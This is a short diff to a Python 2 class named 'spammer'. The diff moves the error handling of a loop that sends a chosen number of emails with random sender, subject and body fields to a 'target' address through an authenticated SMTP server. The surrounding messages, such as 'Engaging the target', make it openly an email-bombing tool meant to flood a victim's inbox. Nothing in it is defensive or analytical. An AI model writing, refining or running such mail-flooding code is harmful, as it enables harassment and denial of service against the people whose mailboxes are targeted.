@@ -33,16 +33,16 @@ class spammer():
         except: print "[-] Authentication Error" ; exit()
 
         print "[!] Engaging the target"
-        for i in xrange(spams):
+        try:
+            for i in xrange(spams):
+                subj = random.randrange(0,999999999999999999)
+                content = random.randrange(0,999999999999999999)
+                name = random.randrange(0,999999999999999999)
+                date = datetime.datetime.now().strftime( "%d/%m/%Y %H:%M" )
+                msg = "From: %s\nTo: %s\nSubject: %s\nDate: %s\n\n%s" % (name, target, subj, date, content)
 
-            subj = random.randrange(0,999999999999999999)
-            content = random.randrange(0,999999999999999999)
-            name = random.randrange(0,999999999999999999)
-            date = datetime.datetime.now().strftime( "%d/%m/%Y %H:%M" )
-            msg = "From: %s\nTo: %s\nSubject: %s\nDate: %s\n\n%s" % (name, target, subj, date, content)
-
-            try: server.sendmail(username, target, msg)
-            except smtplib.SMTPException:
+                server.sendmail(username, target, msg)
+        except smtplib.SMTPException:
         		print "[-] An Error Occured During Process"
         		print "[!] The target email might be wrong"
         		exit()
